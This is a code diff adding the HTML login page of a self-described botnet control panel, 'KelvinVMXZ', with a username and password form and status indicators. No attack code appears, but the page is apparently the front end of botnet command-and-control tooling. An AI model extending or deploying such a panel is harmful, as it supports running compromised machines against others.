@@ -1,1 +1,83 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KelvinVMXZ Botnet - Login</title>
+    <link rel="stylesheet" href="style/login.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <div class="logo">
+                <i class="fas fa-skull-crossbones"></i>
+                <h1>KelvinVMXZ</h1>
+            </div>
+            <p class="subtitle">Advanced Botnet Control Panel</p>
+        </div>
+        
+        <div class="login-card">
+            <div class="card-header">
+                <h2><i class="fas fa-sign-in-alt"></i> Login</h2>
+                <p>Access your control panel</p>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">
+                        <i class="fas fa-user"></i> Username
+                    </label>
+                    <input type="text" id="username" name="username" required 
+                           placeholder="Enter username" autocomplete="off">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">
+                        <i class="fas fa-lock"></i> Password
+                    </label>
+                    <div class="password-input">
+                        <input type="password" id="password" name="password" required 
+                               placeholder="Enter password" autocomplete="off">
+                        <button type="button" class="toggle-password" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <button type="submit" class="login-btn" id="loginBtn">
+                    <i class="fas fa-sign-in-alt"></i> Login
+                    <span class="spinner" id="loginSpinner"></span>
+                </button>
+                
+                <div class="login-footer">
+                    <p class="version">v2.0 • KelvinVMXZ Pro Edition</p>
+                    <p class="warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        Authorized access only. All activities are logged.
+                    </p>
+                </div>
+            </form>
+        </div>
+        
+        <div class="system-status">
+            <div class="status-item">
+                <i class="fas fa-server"></i>
+                <span>API: <span class="status-indicator" id="apiStatus">Checking...</span></span>
+            </div>
+            <div class="status-item">
+                <i class="fas fa-shield-alt"></i>
+                <span>Encryption: <span class="status-ok">Active</span></span>
+            </div>
+            <div class="status-item">
+                <i class="fas fa-users"></i>
+                <span>Users: <span id="userCount">0</span> online</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="notification" id="notification"></div>
+    
+    <script src="js/auth.js"></script>
+</body>
+</html>
